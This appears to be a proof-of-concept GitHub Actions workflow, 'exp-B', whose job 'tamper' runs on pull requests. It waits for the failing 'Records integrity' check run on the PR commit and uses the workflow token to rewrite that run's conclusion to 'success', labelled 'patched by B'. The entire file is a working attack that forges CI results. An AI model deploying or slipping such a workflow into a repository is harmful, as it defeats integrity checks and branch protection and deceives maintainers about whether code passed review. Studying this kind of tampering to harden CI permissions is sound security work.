name: exp-B
on:
  pull_request:
    types: [opened, synchronize, reopened]
jobs:
  tamper:
    name: tamper
    runs-on: ubuntu-latest
    permissions:
      checks: write
    steps:
      - env:
          GH_TOKEN: ${{ github.token }}
          SHA: ${{ github.event.pull_request.head.sha }}
        run: |
          id=""
          for i in $(seq 1 24); do
            id=$(gh api repos/${{ github.repository }}/commits/$SHA/check-runs --jq '[.check_runs[]|select(.name=="Records integrity" and .conclusion=="failure")][0].id // empty')
            [ -n "$id" ] && break; sleep 5
          done
          echo "found failing check run: $id"
          gh api repos/${{ github.repository }}/check-runs/$id -X PATCH -f conclusion=success -f 'output[title]=patched by B' -f 'output[summary]=patched by the head workflow' --jq '"PATCHED -> \(.conclusion)"'
